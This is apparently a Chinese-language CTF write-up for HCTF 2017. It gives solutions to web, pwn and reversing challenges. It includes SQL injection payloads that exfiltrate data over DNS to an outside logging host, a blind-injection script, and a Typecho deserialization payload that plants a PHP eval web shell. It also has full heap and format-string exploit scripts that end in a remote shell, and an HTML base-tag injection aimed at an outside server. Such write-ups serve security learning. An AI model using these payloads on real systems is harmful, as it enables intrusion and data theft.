# web-level1 easy-sign-in|
![](http://oayoilchh.bkt.clouddn.com/17-11-12/5297844.jpg)
![](http://oayoilchh.bkt.clouddn.com/17-11-12/94470302.jpg)
![](http://oayoilchh.bkt.clouddn.com/17-11-12/69658415.jpg)
#  boring website
脑洞ctf？
106.15.53.124开着3306
一行注释 //link server: On  linkname:mysql
然后用mssql连接mysql
dns获取数据。类似这样。
 
```
/?id=11%20union%20select%20*%20from%20OpenQuery(mysql,%27SELECT%20LOAD_FILE(CONCAT(%27%27\\\\%27%27,(SELECT%20(database())),%27%27.c3be3b26.dnslog.link\\a%27%27))%27)
----
webwebweb
sys
secret
name
password
----
/?id=11%20union%20select%20*%20from%20OpenQuery(mysql,%27SELECT%20LOAD_FILE(CONCAT(%27%27\\%27%27,(SELECT%20(select%20passwordctf%20from%20secret%20limit%200,1)),%27%27.c3be3b26.dnslog.link\a%27%27))%27)
```
 
![](http://oayoilchh.bkt.clouddn.com/17-11-12/50887516.jpg)
# SQL Silencer
首先是个注入。要绕过一些过滤
payload如下
 
```
1^(select%0a(select%0aascii(substr(user()%0afrom%0a13)))=115)
```
 
然后要获取flag。flag有两行。我用like搞的
 
```
1^(select%0a(select%0aascii(substr((select%0acount(flag)from%0aflag%0awhere%0aflag%0alike%0a0x7725)%0afrom%0a1)))=49)
```
 
之后获取到flag是
 
```
'What_Un33d1s_under_m3'
'./H3llo111y_Fr13nds_w3lc0me_t0hctf2017'
```
 
 
是一个typecho的getshell
 
```
http://120.78.231.135:13645/index/H3llo_111y_Fr13nds_w3lc0me_t0_hctf2017/install.php?finish=a
 
post
 
__typecho_config=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6NDp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo4OiJBVE9NIDEuMCI7czoyMjoiAFR5cGVjaG9fRmVlZABfY2hhcnNldCI7czo1OiJVVEYtOCI7czoxOToiAFR5cGVjaG9fRmVlZABfbGFuZyI7czoyOiJ6aCI7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6MTp7czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6Njc6ImZpbGVfcHV0X2NvbnRlbnRzKCcuL3VwbG9hZHMvcDAucGhwJywgJzw/cGhwIEBldmFsKCRfUE9TVFtwMF0pOz8+JykiO31zOjI0OiIAVHlwZWNob19SZXF1ZXN0AF9maWx0ZXIiO2E6MTp7aTowO3M6NjoiYXNzZXJ0Ijt9fX19fXM6NjoicHJlZml4IjtzOjc6InR5cGVjaG8iO30=
```
 
并且设置referer同源
就是在uploads下面写个p0.php密码p0
ban了一些函数。不过不是事。
![](http://oayoilchh.bkt.clouddn.com/17-11-12/42242827.jpg)
 
# Evr_Q
![](http://oayoilchh.bkt.clouddn.com/17-11-12/77384649.jpg)
user = M.KATSURAGI
![](http://oayoilchh.bkt.clouddn.com/17-11-12/51105867.jpg)
len(code) = 35
![](http://oayoilchh.bkt.clouddn.com/17-11-12/65011283.jpg)
![](http://oayoilchh.bkt.clouddn.com/17-11-12/75216713.jpg)
![](http://oayoilchh.bkt.clouddn.com/17-11-12/37014922.jpg)
![](http://oayoilchh.bkt.clouddn.com/17-11-12/99312089.jpg)
分析了几个关键函数 写了给IDApython去跑
```python
addr = 0x41b0dc
a = []
 
for i in range(addr,addr+7):
        a.append(Byte(i)^0x76)
 
for i in range(addr+7,addr+14):
        a.append((((Byte(i)<<1)&0xaa)|((Byte(i)&0xaa)>>1))^0x76^0xad)
 
for i in range(addr + 14, addr + 21):
    a.append((((Byte(i)<<2)&0xcc)|((Byte(i)&0xcc)>>2))^0x76^0xbe)
 
for i in range(addr + 21, addr + 28):
    a.append((((Byte(i)<<4)&0xf0)|((Byte(i)&0xf0)>>4))^0x76^0xef)
 
for i in range(addr + 28, addr + 35):
    a.append(Byte(i)^0x76)
print ''.join(chr(i) for i in a)
 
print ''.join(chr(i) for i in a)
```
![](http://oayoilchh.bkt.clouddn.com/17-11-12/11895489.jpg)
 
# babyprintf
先用格式化字符串漏洞泄露`libc`地址，为我们后面的`house of orange`做好准备，但是这里有一个问题就是我们无法泄露`heap`的地址，但是在`house of orange`里面是需要获取`heap`地址来设置`vtable`的。
于是卡了一会，后面发现在`io_str_jumps`里面是有间接调用的，而且我们能够控制这个调用，同时也不需要`heap`地址，于是使用这个已有的虚表，然后就可以了。
```py
#coding:utf-8
from zio import *
from pwn import *
import mypwn
def do_one(io,llen,data):
 
    io.read_until('size:')
    io.writeline(str(llen))
    io.read_until(': ')
    io.writeline(data)
 
if __name__ == '__main__':
    binary_path = "./babyprintf"
    #l=ELF("./docker_64.so")
    #l=ELF("/lib/i386-linux-gnu/libc.so.6")
    r_m = COLORED(RAW, "green")
    w_m = COLORED(RAW, "blue")
    target = binary_path
    bin=ELF(binary_path)
    remote=1
    target = ('47.100.64.113',23332)
    io = zio(target, timeout = 9999, print_read = r_m, print_write = w_m)
    if target == binary_path:
        offset_start_main=0x21F45
        l=ELF("/lib/x86_64-linux-gnu/libc.so.6")
    if remote==1:
        io.read_until('please input you token\n')
        io.writeline('qdoinRjE8vGEtOfeMlqfRnfOFVoFQ1b5')
        offset_start_main=0x203F1
        l=ELF("./libc-2.24.so")
        offset_binsh=0x18AC40
    io.read_until('size:')
    llen=0x90-8
    io.writeline(str(llen))
    io.read_until(': ')
    leak_libc='%1$p %2$p %3$p %4$p %5$p aaa %6$p %7$p bbb %8$p '
    sstr='%p'*90
    io.writeline(leak_libc)
    io.read_until('aaa ')
    data=io.read_until(' ')[:-1]
    real_start_main=int(data,16)
    io.read_until('bbb ')
    data=io.read_until(' ')[:-1]
    stack_pointer=int(data,16)
    libc_base=real_start_main-offset_start_main
    real_io_list=libc_base+l.symbols['_IO_list_all']
    real_io_stdin_buf_base=libc_base+l.symbols['_IO_2_1_stdin_']+0x40
    real_system=libc_base+l.symbols['system']
    real_binsh=libc_base+offset_binsh
    mypwn.log('real_start_main',real_start_main)
    mypwn.log('stack_pointer',stack_pointer)
    mypwn.log('real_io_list',real_io_list)
    mypwn.log('libc_base',libc_base)
    mypwn.log('real_io_stdin_buf_base',real_io_stdin_buf_base)
    mypwn.log('real_binsh',real_binsh)
 
    #house of orange
    do_one(io,0x90-8,'a'*0x80+p64(0)+p64(0xee1))
    io.gdb_hint()
    do_one(io,0x1000-8,'b'*0x80+p64(0)+p64(0x61)+p64(0xddaa)+p64(real_io_list-0x10))
 
    #do_one(io,0x90-8,'a'*0x10)
    fake_chunk='\x00'*8+p64(0x61)#why ? io_file?
    fake_chunk+=p64(0xddaa)+p64(real_io_list-0x10)
    fake_chunk+=p64(0xffffffffffffff)+p64(0x2)+p64(0)*2+p64( (real_binsh-0x64)/2 )
    fake_chunk=fake_chunk.ljust(0xa0,'\x00')
    fake_chunk+=p64(real_system+0x420)
    fake_chunk=fake_chunk.ljust(0xc0,'\x00')
    fake_chunk+=p64(1)
    vtable_addr=libc_base+0x3BE4C0
    payload =fake_chunk
    payload += p64(0)
    payload += p64(0)
    payload += p64(vtable_addr)
    payload += p64(real_system)
    payload += p64(2)
    payload += p64(3)
    payload += p64(0)*3 # vtable
    payload += p64(real_system)
 
    #do_one(io,0x90-8,'c'*0x80+p64(0)+p64(0x61)+p64(libc_base+0x3c17b8)+p64(real_io_list-0x10) )
    do_one(io,0x90-8,'c'*0x80+payload )
 
    #trigger_ unsort bin
 
    #do_one(io,0x1000-8,'%1$p %2$p %3$p %4$p %5$p aaa %6$p %7$p'+'\x00'*2+'aaaa')
 
 
    io.interact()
 
```
# guestbook
format
![](http://oayoilchh.bkt.clouddn.com/17-11-12/16540112.jpg)
leak text_offset
![](http://oayoilchh.bkt.clouddn.com/17-11-12/22038140.jpg)
leak libc_offset
利用栈上指向__libc_start_main函数的ret地址泄露libc偏移地址
于是text和libc的地址都已泄露
 
由于fmt在堆上，于是只能用ebp链搞了，可以写任意地址到栈上 

如图例，写了puts的got表到栈上
![](http://oayoilchh.bkt.clouddn.com/17-11-12/34125901.jpg)
由于开了full relro，所以不能用got写了
思路如下
先用ebp链指针写__free_hook的地址到栈上
再利用这个指针写system的地址__free_hook上，于是free --> system
我这里是这样：
写__free_hook地址到栈上，用%hn写system函数地址的低2字节到__free_hook地址；
再写__free_hook + 2地址到栈上， 用%hn写system函数地址的高2字节到__free_hook+2地址。
由于只在phone num的chunk调用了free，所以只好system(phone num)
 
而phone num只可以输入数字和符号
 
骚操作
r"${0##-}&&".ljust(16,'0')
于是就利用linux的sh变量调用了sh，okk
```py
from pwn import *
 
context.arch="i386"
context.word_size=32
context.os="linux"
context.endian="little"
context.terminal = ['deepin-terminal','-x','sh','-c']
 
elf = ELF("./guest")
#io = process("./guest")
io = remote("47.100.64.171",20002)
io.writeline("qdoinRjE8vGEtOfeMlqfRnfOFVoFQ1b5")
libc = ELF("./libc.so.6")
#gdb.attach(io)
io.readuntil("your choice:\n")
io.writeline("1")
io.readuntil("your name")
io.write("%08x")
io.readuntil("your phone?\n")
io.write("0"*0x16)
io.readuntil("your choice:\n")
io.writeline("2")
io.readuntil("Plz input the guest index:\n")
io.writeline("0")
io.readuntil("the name:")
 
text_offset = int(io.readline()[:8],16) & 0xfffff000
 
print "text_offset->",hex(text_offset)
 
#io.readuntil("please input you token\n")
#io.writeline("qdoinRjE8vGEtOfeMlqfRnfOFVoFQ1b5")
 
io.readuntil("your choice:\n")
io.writeline("1")
io.readuntil("your name")
io.write("%89$08x###")
io.readuntil("your phone?\n")
io.write("0"*0x16)
io.readuntil("your choice:\n")
io.writeline("2")
io.readuntil("Plz input the guest index:\n")
io.writeline("1")
io.readuntil("the name:")
libc_start_main_offset = io.readline()
print libc_start_main_offset
libc_start_main_offset = int(libc_start_main_offset[:8], 16)
print "leaked_addr->",hex(libc_start_main_offset)
libc_offset = libc_start_main_offset - libc.symbols["__libc_start_main"] - 247
system_addr = libc_offset + libc.symbols["system"]
bash_addr = libc_offset + libc.search("/bin/sh").next()
hook_addr = libc.symbols["__free_hook"] + libc_offset
 
print "libc_offset->",hex(libc_offset)
print "system_addr->",hex(system_addr)
print "bash_addr->",hex(bash_addr)
print "hook_addr->",hex(hook_addr)
 
print "leaked finished, write to saved eip and parameter!"
 
got_puts = 0x2fd0 + text_offset
 
print "got_puts->",hex(got_puts)
 
#got_puts_lowbits = got_puts & 0xffff
 
print "leak ebp link to addr_ret"
 
io.readuntil("your choice:\n")
io.writeline("1")
io.readuntil("your name")
io.write("%72$08x")
io.readuntil("your phone?\n")
io.write("0"*0x16)
io.readuntil("your choice:\n")
io.writeline("2")
io.readuntil("Plz input the guest index:\n")
io.writeline("2")
io.readuntil("the name:")
 
ptr_ret = int(io.readline()[:8],16)
print "ebp_link->",hex(ptr_ret)
 
ptr_ret_low_byte = (ptr_ret & 0xff) - 0x04
 
 
print "write ebp to ret + 2", hex(ptr_ret_low_byte + 2)
 
io.readuntil("your choice:\n")
io.writeline("1")
io.readuntil("your name")
io.write("%0"+str(ptr_ret_low_byte + 2) + "x" + "%72$hhn")
io.readuntil("your phone?\n")
io.write("0"*0x16)
io.readuntil("your choice:\n")
io.writeline("2")
io.readuntil("Plz input the guest index:\n")
io.writeline("3")
 
 
print "write ret_addr high 2 byte to hook_addr"
 
io.readuntil("your choice:\n")
io.writeline("1")
io.readuntil("your name")
io.write("%0"+str(hook_addr >> 16) + "x" + "%80$hn")
io.readuntil("your phone?\n")
io.write("0"*0x16)
io.readuntil("your choice:\n")
io.writeline("2")
io.readuntil("Plz input the guest index:\n")
io.writeline("4")
 
 
print "write ebp to ret", hex(ptr_ret_low_byte )
 
io.readuntil("your choice:\n")
io.writeline("1")
io.readuntil("your name")
io.write("%0"+str(ptr_ret_low_byte) + "x" + "%72$hhn")
io.readuntil("your phone?\n")
io.write("0"*0x16)
io.readuntil("your choice:\n")
io.writeline("2")
io.readuntil("Plz input the guest index:\n")
io.writeline("5")
 
 
 
print "write ret_addr low 2 byte to hook_addr"
 
io.readuntil("your choice:\n")
io.writeline("1")
io.readuntil("your name")
io.write("%0"+str(hook_addr & 0xffff) + "x" + "%80$hn")
io.readuntil("your phone?\n")
io.write("0"*0x16)
io.readuntil("your choice:\n")
io.writeline("2")
io.readuntil("Plz input the guest index:\n")
io.writeline("6")
 
#pause()
 
print "write hook_addr low 2 byte to system_addr"
 
io.readuntil("your choice:\n")
io.writeline("1")
io.readuntil("your name")
io.write("%0"+str(system_addr & 0xffff) + "x" + "%79$hn")
io.readuntil("your phone?\n")
io.write("0"*0x16)
io.readuntil("your choice:\n")
io.writeline("2")
io.readuntil("Plz input the guest index:\n")
io.writeline("7")
 
print "write ret_addr low 2 byte to hook_addr + 2"
 
io.readuntil("your choice:\n")
io.writeline("1")
io.readuntil("your name")
io.write("%0"+str((hook_addr & 0xffff) + 2) + "x" + "%80$hn")
io.readuntil("your phone?\n")
io.write("0"*0x16)
io.readuntil("your choice:\n")
io.writeline("2")
io.readuntil("Plz input the guest index:\n")
io.writeline("8")
 
print "write hook_addr high 2 byte to system_addr"
 
io.readuntil("your choice:\n")
io.writeline("1")
io.readuntil("your name")
io.write("%0"+str(system_addr >> 16) + "x" + "%79$hn")
io.readuntil("your phone?\n")
io.write("0"*0x16)
io.readuntil("your choice:\n")
io.writeline("2")
io.readuntil("Plz input the guest index:\n")
io.writeline("9")
 
#io.readuntil("your choice:\n")
io.writeline("3")
io.writeline("0")
 
io.readuntil("your choice:\n")
io.writeline("1")
io.writeline("asd")
io.readuntil("your phone?\n")
io.writeline(r"${0##-}&&".ljust(16,'0'))
 
#io.readuntil("your choice:\n")
io.writeline("3")
io.writeline("0")
 
print "----------SHELL GOT---------"
 
io.interactive()
 
```
# big_zip
crc32碰撞，组成一个比较大的txt内容，然后进行明文攻击，解开压缩就可以了
 
# Repeater
空格和|用%09绕过
参考：https://0day.work/jinja2-template-injection-filter-bypasses/
![](http://oayoilchh.bkt.clouddn.com/17-11-12/43763509.jpg)
 
# poker2
升级打怪,刷圣诞节副本
![](http://oayoilchh.bkt.clouddn.com/17-11-13/33084066.jpg)
 
```html
One of your pets:level:100
hctf{Go0dLuck_toGetTheFl3g__from_game}</body>
</html>
```
# A World Restored Again
 
注册用户名为 `<base href=http://ricterz.me:1234></base>`，控制 js 即可读取 flag。
 
# poker-poker
 
盲注，脚本如下：
 
```python
#!/usr/bin/env python
# encoding: utf-8
 
import requests
url="http://petgame.2017.hctf.io/function/Pets_Mod.php?uid={param}"
r=requests.session()
header={
    "Cookie":"PHPSESSID=h6qoug405qtu3gljjkrpggtje2"
}
def doinject(param):
 
    result=r.get(url.format(param=param),headers=header)
    content=result.content
    #print content
    if "25.gif" in content:
        return 1
    elif "2.gif" in content:
        return 0
    else:
        return -1
ans=""
 
for i in xrange(1,100):
    start=1
    end=127
    while(start!=end):
        print str(start)+" : "+str(end)
        if(end-start==1):
            param="-1' or if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{start},1)>'{alpha}',1,0)--+".format(start=str(i),alpha=chr(end))
            if doinject(param)==1:
                end=start
            else:
                start=end
        else:
            mid=(start+end)/2
            param="-1' or if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{start},1)>'{alpha}',1,0)--+".format(start=str(i),alpha=chr(mid))
            #print param
            tag=doinject(param)
            #print tag
            if tag==1:
                start=mid
            elif tag==-1:
                end+=1
            else:
                end=mid
    ans+=chr(start)
    print ans
print ans
```
 
最后 FLAG 在 HCTF.FLAG2 里。